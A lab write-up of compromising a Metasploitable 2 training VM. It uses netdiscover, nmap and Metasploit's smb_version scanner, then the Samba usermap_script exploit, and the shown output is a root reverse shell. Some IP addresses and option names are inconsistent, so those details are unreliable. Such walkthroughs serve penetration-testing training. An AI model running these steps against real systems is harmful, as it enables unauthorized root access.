# Metasploitable 2 Samba exploit write-up

Metasploitable 2 is Virtual Machine with many exploitable ports and now we are going to exploit it's one of exploit - Samba.



 > The target of this lab is use vulnerablitity in **Samba** service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.126.0/16   |   Screen View: Unique Hosts                                                                                    
                                                                                                                                                         
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.43.95   00:0c:29:c8:07:4e      1      60  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.95 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

.
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
.
.
.
```

First, we have to find the version of Smaba, because it's not clear from `smbd 3.X - 4.X`. So,

Run metasploit `sudo msfdb init && msfconsole`.

Now search if it has any aux that wil find smb version.

`msf6 > search smb version`

We got;

```
.
.
103  auxiliary/scanner/smb/smb_version                                          .                normal     No     SMB Version Detection
.
.
```

Use that aux; `msf6 > use 103`

To get options; `msf6 auxiliary(scanner/smb/smb_version) > show options`

We only need to set remote Host IP address, So,

`msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.43.95`

And hit `run`.

```
*] 192.168.43.95:445     - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 192.168.43.95:445     -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 192.168.43.95:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> We've got the version - **Samba 3.0.20-Debian** (Debian suggest it's Linux)


## Exploitation:

After a little search with searchsploit and smb version, we've found `usermap_script` that will help us in exploiting smb port.

Now, in metasploit;

`msf6 > search usermap_script`

```
Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
```

To get options; `msf6 exploit(multi/samba/usermap_script) > show options`

Only need to Remote host IP address;

 `msf6 exploit(multi/samba/usermap_script) > set CHOST 192.168.43.132`


Hit `run`

```
[*] Started reverse TCP handler on 192.168.43.132:4444 
[*] Command shell session 1 opened (192.168.43.132:4444 -> 192.168.43.95:33297) at 2024-07-09 06:02:09 -0400

whoami
root
```

We logged in as ROOT.
